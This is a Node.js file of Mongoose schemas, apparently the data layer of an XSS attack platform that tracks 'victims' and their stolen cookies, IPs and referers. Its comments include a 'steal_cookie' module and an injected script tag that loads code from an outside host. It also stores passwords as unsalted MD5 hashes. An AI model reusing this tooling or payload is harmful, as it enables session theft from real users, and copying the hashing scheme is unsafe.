var mongoose = require('mongoose'),
    crypto = require('crypto');
var Schema = mongoose.Schema;

var _User = new Schema({
    name:String,
    passwd:String,
    watch:[]
});
var _Item = new Schema({
    name:String,
    group:String,
    payload:String,
    load:{},
    /*
    *   load:{
    *       "steal_cookie":{
    *           "post":"steal_cookie"
    *       }
    *   }
    */
    modules:[]
    /*
    *   modules:[
    *       ["autoinfo", {}],
    *       ["test", {"str":"test"}]
    *   ]
    */
});
var _Victim = new Schema({
    group:String,
    name:String,
    who:String,
    payload:String,
    load:{},
    modules:{},
    status:{},
    /*
    *   status:{
    *       "Server":{
    *           "referer":["http://127.0.0.1/", "http://localhost/"],
    *           "ip":["127.0.0.1"]
    *       },
    *       "Browser":{
    *           "cookie":["who=yyyyy", "who=what"],
    *           "the_page":["<script src=//viii.ml/?i=*>"]
    *       }
    *   }
    */
    now:String
});
var _Page = new Schema({
    name:String,
    uri:String,
    modules:{}
});

exports.hash = function(str){
    return crypto.createHash('md5').update(str).digest('hex');
};
exports.User = mongoose.model('User', _User);
exports.Item = mongoose.model('Item', _Item);
exports.Victim = mongoose.model('Victim', _Victim);
exports.Page = mongoose.model('Page', _Page);
